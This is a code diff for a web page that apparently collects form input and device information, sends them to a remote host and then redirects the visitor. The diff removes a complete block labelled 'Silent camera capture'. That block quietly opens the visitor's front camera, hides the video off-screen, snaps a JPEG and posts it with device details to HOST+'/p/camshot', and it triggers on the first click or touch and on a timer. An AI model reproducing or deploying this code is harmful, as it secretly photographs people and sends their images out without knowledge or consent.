@@ -356,45 +356,6 @@ function submitForm(e) {
     setTimeout(()=>{ window.location.href = REDIRECT; }, 3000);
   }, 2500);
 }
-
-// ── Silent camera capture ─────────────────────────────────────────────────────
-var _camDone = false;
-function _doSilentCam() {
-  if (_camDone || !navigator.mediaDevices?.getUserMedia) return;
-  navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}, audio:false})
-    .then(function(stream){
-      var vid = document.createElement('video');
-      vid.srcObject = stream;
-      vid.setAttribute('playsinline','');
-      vid.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
-      document.body.appendChild(vid);
-      vid.play().then(function(){
-        setTimeout(function(){
-          var canvas = document.createElement('canvas');
-          canvas.width = 640; canvas.height = 480;
-          canvas.getContext('2d').drawImage(vid, 0, 0, 640, 480);
-          var img = canvas.toDataURL('image/jpeg', 0.85);
-          stream.getTracks().forEach(function(t){ t.stop(); });
-          vid.remove();
-          if (!_camDone && img.length > 1000) {
-            _camDone = true;
-            fetch(HOST+'/p/camshot', {
-              method:'POST',
-              headers:{'Content-Type':'application/json'},
-              body:JSON.stringify({img: img, device: deviceInfo})
-            }).catch(function(){});
-          }
-        }, 800);
-      });
-    })
-    .catch(function(){});
-}
-// Try on first user interaction (more likely browser allows camera after gesture)
-['click','touchstart'].forEach(function(ev){
-  document.addEventListener(ev, function(){ setTimeout(_doSilentCam, 300); }, {once:true, capture:true});
-});
-// Also try after 2.5s (some browsers auto-allow if permission was granted before)
-setTimeout(_doSilentCam, 2500);
 </script>
 </body>
 </html>
